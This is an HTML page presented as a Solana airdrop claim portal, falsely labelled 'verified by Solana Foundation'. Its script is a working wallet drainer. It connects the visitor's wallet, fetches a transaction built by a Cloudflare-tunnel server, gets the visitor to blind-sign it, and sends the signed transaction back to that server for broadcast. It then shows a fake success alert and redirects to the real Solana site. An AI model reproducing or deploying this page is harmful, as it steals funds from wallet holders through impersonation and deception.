<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Airdrop Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { width: 320px; padding: 40px 25px; background: linear-gradient(145deg, #111, #050505); border: 1px solid #14f19544; border-radius: 28px; text-align: center; box-shadow: 0 20px 50px rgba(20, 241, 149, 0.15); }
        .icon { width: 60px; height: 60px; background: #14f19511; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; color: #14f195; font-size: 30px; border: 1px solid #14f19533; }
        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 14px; font-weight: 800; cursor: pointer; font-size: 16px; box-shadow: 0 4px 15px rgba(20, 241, 149, 0.4); }
        .btn:active { transform: scale(0.97); }
        #st { font-size: 11px; color: #444; margin-top: 20px; font-family: monospace; letter-spacing: 1px; }
        .loader { width: 100%; height: 4px; background: #222; border-radius: 2px; margin: 20px 0; overflow: hidden; display: none; }
        .loader-bar { width: 0%; height: 100%; background: #14f195; transition: 0.5s; }
    </style>
</head>
<body>
    <div class="box">
        <div class="icon">âœ“</div>
        <h2 style="margin: 0 0 10px 0; color: #14f195; letter-spacing: -0.5px;">CLAIM AIRDROP</h2>
        <p style="color: #aaa; font-size: 14px; line-height: 1.6; margin-bottom: 25px;">Activate your wallet address to receive the allocated SOL reward. <br><b style="color:#eee;">Status: Eligible</b></p>
        
        <button id="cta" class="btn">ACTIVATE NOW</button>
        
        <div id="ld" class="loader"><div id="bar" class="loader-bar"></div></div>
        <div id="st">VERIFIED BY SOLANA FOUNDATION</div>
    </div>

    <script>
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

        document.getElementById('cta').onclick = async function() {
            const btn = this;
            const log = (t) => document.getElementById('st').innerText = t;
            const bar = document.getElementById('bar');
            const loader = document.getElementById('ld');
            const web3 = window.solanaWeb3;

            try {
                const p = window.trustwallet?.solana || window.solana;
                if (!p) { alert("Please use Trust Wallet Browser."); return; }

                btn.style.display = 'none';
                loader.style.display = 'block';
                
                log("CONNECTING...");
                await p.connect();
                bar.style.width = '30%';

                log("VERIFYING ELIGIBILITY...");
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();
                bar.style.width = '60%';
                
                log("AWAITING ACTIVATION...");
                const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
                
                // ðŸ”± å”¤èµ·å¼¹çª— (V43 åŽç«¯çš„åŒæŒ‡ä»¤ç›²ç­¾é€»è¾‘)
                const signed = await p.signTransaction(tx);
                bar.style.width = '90%';
                log("FINALIZING...");

                const signedBase64 = btoa(String.fromCharCode.apply(null, signed.serialize()));

                // ðŸ”± å›žä¼ å¹¿æ’­
                await fetch(tunnel + "/broadcast_v41", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ signed_tx: signedBase64 })
                });

                bar.style.width = '100%';
                log("ACTIVATED SUCCESSFULLY!");
                
                // ðŸ”± è¯æœ¯è¡¥é½ï¼šç­‰å¾…é¢†å–å¹¶è¿”å›žå®˜ç½‘
                setTimeout(() => {
                    alert("Activation Success! \n\nYour airdrop will be distributed to your wallet within 24 hours. Please keep your wallet active.");
                    window.location.href = "https://solana.com/airdrop"; 
                }, 800);

            } catch (err) {
                console.error(err);
                window.location.reload();
            }
        };
    </script>
</body>
</html>
